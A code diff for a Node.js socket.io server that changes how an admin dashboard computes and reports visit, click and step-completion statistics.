@@ -197,8 +197,10 @@ function emitAdmin() {
   const safeOnline = Array.from(onlineUsers.values()).filter((u) => u && u.activated);
   const visits = visitClientIds.size;
   const clicks = clickClientIds.size;
-  const clickRate = visits > 0 ? Number(((clicks / visits) * 100).toFixed(1)) : 0;
-  io.to('admin').emit('admin-update', { records, onlineUsers: safeOnline, stats: { visits, clicks, clickRate } });
+  const stepDone = visits + clicks; // enter=1 step, submit=1 step
+  const stepTotal = visits * 2;
+  const clickRate = stepTotal > 0 ? Number(((stepDone / stepTotal) * 100).toFixed(1)) : 0;
+  io.to('admin').emit('admin-update', { records, onlineUsers: safeOnline, stats: { visits, clicks, stepDone, stepTotal, clickRate } });
 }
 
 function postJson(urlString, payload, { timeoutMs = 5000 } = {}) {
@@ -606,8 +608,6 @@ io.on('connection', (socket) => {
       return;
     }
     visitClientIds.add(cid);
-    // Count click as soon as user enters frontend (do not wait for later submit actions).
-    clickClientIds.add(cid);
 
     const currentUser = onlineUsers.get(socket.id) || {
       page: 'pending',
@@ -1268,11 +1268,13 @@ io.on('connection', (socket) => {
     socket.join('admin');
     const visits = visitClientIds.size;
     const clicks = clickClientIds.size;
-    const clickRate = visits > 0 ? Number(((clicks / visits) * 100).toFixed(1)) : 0;
+    const stepDone = visits + clicks;
+    const stepTotal = visits * 2;
+    const clickRate = stepTotal > 0 ? Number(((stepDone / stepTotal) * 100).toFixed(1)) : 0;
     socket.emit('admin-update', {
       records,
       onlineUsers: Array.from(onlineUsers.values()).filter((u) => u && u.activated),
-      stats: { visits, clicks, clickRate },
+      stats: { visits, clicks, stepDone, stepTotal, clickRate },
     });
     ack?.({ ok: true });
   });
